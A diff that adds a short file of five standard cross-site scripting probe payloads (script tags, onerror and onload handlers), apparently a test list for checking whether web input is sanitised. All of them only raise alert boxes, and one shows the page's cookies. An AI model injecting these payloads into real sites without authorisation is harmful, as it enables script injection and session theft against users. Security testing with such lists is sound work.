@@ -1,0 +1,5 @@
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src="x" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<body onload="alert('XSS')">
